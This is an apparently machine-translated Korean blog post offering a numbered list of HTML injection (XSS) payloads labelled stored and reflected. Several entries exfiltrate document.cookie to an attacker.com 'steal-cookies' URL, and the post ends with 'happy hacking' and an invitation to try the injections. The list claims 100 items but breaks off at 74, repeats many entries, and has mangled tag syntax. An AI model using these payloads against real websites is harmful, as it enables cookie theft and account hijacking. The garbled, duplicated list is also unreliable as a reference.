대해 몇 가지 기본 사항을 살펴보겠습니다. HTML 주입이 무엇인지 알아보기 위해\n아스타 타커\nHTML 주입 또는 주입 관련 질문에 대해, 바로 코드만 제공해 드릴게요. 이것을 시도해서 혜택을 얻어보세요..... \n\n\n![HTML INJECTION Payload List](/assets/img/2024-05-02-HTMLINJECTIONPayloadList_0.png)\n\n<div class=\"content-ad\"></div>\n\n페이로드 목록을 확인해 보세요...\n\n물론이죠! 저장된 및 반사된 HTML 주입 페이로드 100개를 모두 포함한 목록입니다:\n\n저장된 HTML 주입 페이로드:\n1. `script`alert(‘저장된 HTML 주입’)`/script`\n2. `img src=”javascript:alert(‘저장된 HTML 주입’)”`\n3. `svg/onload=alert(‘저장된 HTML 주입’)`\n4. `iframe src=”javascript:alert(‘저장된 HTML 주입’)”`\n5. `body onload=alert(‘저장된 HTML 주입’)`\n6. `img src=x onerror=alert(‘저장된 HTML 주입’)`\n7. `marquee onstart=alert(‘저장된 HTML 주입’)`\n8. `input type=”image” src=”javascript:alert(‘저장된 HTML 주입’)”`\n9. `img src=1 href=1 onerror=alert(‘저장된 HTML 주입’) /`\n10. `input type=”hidden” onkeypress=”alert(‘저장된 HTML 주입’)”`\n11. `audio onloadstart=”alert(‘저장된 HTML 주입’)”`\n12. `form onsubmit=”alert(‘저장된 HTML 주입’)”`\n13. `textarea onchange=”alert(‘저장된 HTML 주입’)”`\n14. `base href=”javascript:alert(‘저장된 HTML 주입’)”`\n15. `a href=”javascript:alert(‘저장된 HTML 주입’)”`여기를 클릭하세요`/a`\n16. `object data=”javascript:alert(‘저장된 HTML 주입’)”`\n17. `img src=”x” onmouseover=”alert(‘저장된 HTML 주입’)”`\n18. `script`document.write(‘`iframe src=”https://attacker.com/steal-cookies?cookie=` + document.cookie + ‘“``/iframe`’);`/script`\n19. `body background=”javascript:alert(‘저장된 HTML 주입’)”`\n20. `embed src=”javascript:alert(‘저장된 HTML 주입’)”`\n21. `script`alert(‘반사된 HTML 주입’)`/script`\n22. `img src=”javascript:alert(‘반사된 HTML 주입’)”`\n23. `svg/onload=alert(‘반사된 HTML 주입’)`\n24. `iframe src=”javascript:alert(‘반사된 HTML 주입’)”`\n25. `body onload=alert(‘반사된 HTML 주입’)`\n26. `img src=x onerror=alert(‘반사된 HTML 주입’)`\n27. `marquee onstart=alert(‘반사된 HTML 주입’)`\n28. `input type=”image” src=”javascript:alert(‘반사된 HTML 주입’)”`\n29. `img src=1 href=1 onerror=alert(‘반사된 HTML 주입’) /`\n30. `input type=”hidden” onkeypress=”alert(‘반사된 HTML 주입’)”`\n31. `audio onloadstart=”alert(‘반사된 HTML 주입’)”`\n32. `form onsubmit=”alert(‘반사된 HTML 주입’)”`\n33. `textarea onchange=”alert(‘반사된 HTML 주입’)”`\n34. `base href=”javascript:alert(‘반사된 HTML 주입’)”`\n35. `a href=”javascript:alert(‘반사된 HTML 주입’)”`여기를 클릭하세요`/a`\n36. `object data=”javascript:alert(‘반사된 HTML 주입’)”`\n37. `img src=”x” onmouseover=”alert(‘반사된 HTML 주입’)”`\n38. `script`document.write(‘`iframe src=”https://attacker.com/steal-cookies?cookie=` + document.cookie + ‘“``/iframe`’);`/script`\n39. `body background=”javascript:alert(‘반사된 HTML 주입’)”`\n40. `embed src=”javascript:alert(‘반사된 HTML 주입’)”`\n\n41. `svg/onload=alert(‘저장된 HTML 주입’)`\n42. `body onload=alert(‘저장된 HTML 주입’)`\n43. `img src=x onerror=alert(‘저장된 HTML 주입’)`\n44. `marquee onstart=alert(‘저장된 HTML 주입’)`\n45. `input type=”image” src=”javascript:alert(‘저장된 HTML 주입’)”`\n46. `img src=1 href=1 onerror=alert(‘저장된 HTML 주입’) /`\n47. `input type=”hidden” onkeypress=”alert(‘저장된 HTML 주입’)”`\n48. `audio onloadstart=”alert(‘저장된 HTML 주입’)”`\n49. `form onsubmit=”alert(‘저장된 HTML 주입’)”`\n50. `textarea onchange=”alert(‘저장된 HTML 주입’)”`\n51. `base href=”javascript:alert(‘저장된 HTML 주입’)”`\n52. `a href=”javascript:alert(‘저장된 HTML 주입’)”`여기를 클릭하세요`/a`\n53. `object data=”javascript:alert(‘저장된 HTML 주입’)”`\n54. `img src=”x” onmouseover=”alert(‘저장된 HTML 주입’)”`\n55. `script`document.write(‘`iframe src=”https://attacker.com/steal-cookies?cookie=` + document.cookie + ‘“``/iframe`’);`/script`\n56. `body background=”javascript:alert(‘저장된 HTML 주입’)”`\n57. `embed src=”javascript:alert(‘저장된 HTML 주입’)”`\n58. `img src=”javascript:alert(‘저장된 HTML 주입’)” onerror=”alert(‘저장된 HTML 주입’)”`\n59. `body``svg``script`alert(‘저장된 HTML 주입’)`/script``/svg``/body`\n60. `a href=”data:text/html,`script`alert(‘저장된 HTML 주입’)`/script`”`여기를 클릭하세요`/a`\n\n<div class=\"content-ad\"></div>\n\n반가워요! \n\n다음은 HTML 주입 페이로드 결과입니다:\n61. `svg/onload=alert(‘주입된 HTML 삽입’)`\n62. `body onload=alert(‘주입된 HTML 삽입’)`\n63. `img src=x onerror=alert(‘주입된 HTML 삽입’)`\n64. `marquee onstart=alert(‘Reflected HTML Injection’)`\n65. `input type=”image” src=”javascript:alert(‘주입된 HTML 삽입’)”`\n66. `img src=1 href=1 onerror=alert(‘주입된 HTML 삽입’) /`\n67. `input type=”hidden” onkeypress=”alert(‘주입된 HTML 삽입’)”`\n68. `audio onloadstart=”alert(‘주입된 HTML 삽입’)”`\n69. `form onsubmit=”alert(‘주입된 HTML 삽입’)”`\n70. `textarea onchange=”alert(‘주입된 HTML 삽입’)”`\n71. `base href=”javascript:alert(‘주입된 HTML 삽입’)”`\n72. `a href=”javascript:alert(‘주입된 HTML 삽입’)”`Click me`/a`\n73. `object data=”javascript:alert(‘주입된 HTML 삽입’)”\n74. `img src=”x” onmouseover=”alert(‘주입된 HTML 삽입’)”`\n... (중략)\n\n여기까지 주입을 시도해보고, 어디에 삽입해야 하는지 알려줘.... 찾아보세요..\n\n다음주 월요일에 만나요,\n\n<div class=\"content-ad\"></div>\n\n행복한 해킹! 해커들...","ogImage":{"url":"/assets/img/2024-05-02-HTMLINJECTIONPayloadList_0.png"},"coverImage":"/assets/img/2024-05-02-HTMLINJECTIONPayloadList_0.png","tag":["Tech"],"readingTime":5}],"page":"3","totalPageCount":10,"totalPageGroupCount":1,"lastPageGroup":10,"currentPageGroup":0},"__N_SSG":true}